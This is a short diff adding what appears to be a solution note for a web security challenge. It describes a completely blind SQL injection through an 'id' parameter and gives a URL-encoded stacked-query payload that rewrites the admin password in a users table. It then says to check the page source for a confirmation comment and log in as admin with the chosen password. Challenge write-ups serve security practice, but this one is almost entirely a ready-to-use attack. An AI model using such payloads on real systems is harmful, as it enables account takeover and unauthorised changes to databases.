@@ -1,0 +1,7 @@
+this requires stacked queries and a lot of patience
+it isn't like a normal blind injection. it is blind as in COMPLETELY blind
+inject through the id variable again
+
+home;%20update%20users%20set%20pass%20%3D%20%27poop%27%20where%20user%3D%27admin%27%20--
+check the source and you should see <!-- Query was changed! Possible injection code -->
+then login with your password you chose. in my case, poop
